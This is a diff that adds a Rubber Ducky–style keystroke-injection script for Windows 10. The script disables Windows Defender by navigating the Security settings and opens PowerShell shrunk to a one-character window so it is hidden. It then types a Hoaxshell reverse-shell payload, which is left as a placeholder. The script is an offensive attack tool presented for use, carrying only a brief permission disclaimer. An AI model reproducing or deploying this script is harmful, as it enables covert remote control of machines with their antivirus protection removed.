@@ -1,0 +1,39 @@
+REM Author: nuvo
+REM Target: windows 10 
+REM Description: turn off windows defender, reverse shell, user (if system32 is wanted change after powershell to control shift enter)
+REM THIS SCRIPT IS INTENDED FOR USE ON SYSTEMS YOU OWN OR HAVE BEEN GIVEN PERMISSION TO USE, I TAKE NO RESPONSIBILITIES FOR ANY MISUSE
+DELAY 1000
+CTRL ESC
+DELAY 300
+REM this block disables windows defender, delete it if you don't need to. target may have varibles that mean you need to change how many times "TAB" is hit
+STRING windows security
+DELAY 300
+ENTER
+DELAY 1000
+ENTER
+TAB
+TAB
+TAB
+TAB
+DELAY 300
+ENTER
+DELAY 600
+SPACE
+DELAY 600
+LEFT
+ENTER
+DELAY 300
+ALT F4
+REM the rest runs the hoax shell while powershell is 1 frame
+GUI r
+DELAY 300
+STRING powershell
+ENTER
+DELAY 600
+STRING powershell -noexit -command "[console]::WindowWidth=1; [console]::WindowHeight=1; [console]::BufferWidth=[console]::WindowWidth"
+DELAY 100
+ENTER
+DELAY 200
+STRING {Hoaxshell revshell}
+DELAY 100
+ENTER
